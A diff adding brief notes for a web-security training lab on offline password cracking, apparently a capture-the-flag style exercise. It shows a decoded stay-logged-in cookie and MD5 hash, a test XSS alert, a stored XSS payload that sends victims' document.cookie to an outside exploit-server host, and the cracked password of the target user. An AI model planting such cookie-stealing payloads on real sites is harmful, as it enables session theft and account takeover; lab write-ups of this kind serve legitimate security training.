@@ -1,0 +1,22 @@
+Lab #8: Offline password cracking
+
+End goal: 
+- obtain Carlos's stay-logged-in cookie
+- crack his password
+- log in as carlos and delete the account
+
+Analysis:
+
+Set-cookie: stay-logged-in=d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw
+--> decode - wiener:51dc30ddc473d43a6011e9ebba6ca770
+
+
+Comments part:
+<script>alert(1)</script>
+--> recieve alert 1
+
+<script>document.location='https://exploit-0a2e00b70483f311801d02a701b000a9.exploit-server.net/exploit'+document.cookie</script>
+
+Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz
+--> carlos:26323c16d5f4dabff3bb136f2460a943
+--> onceuponatime
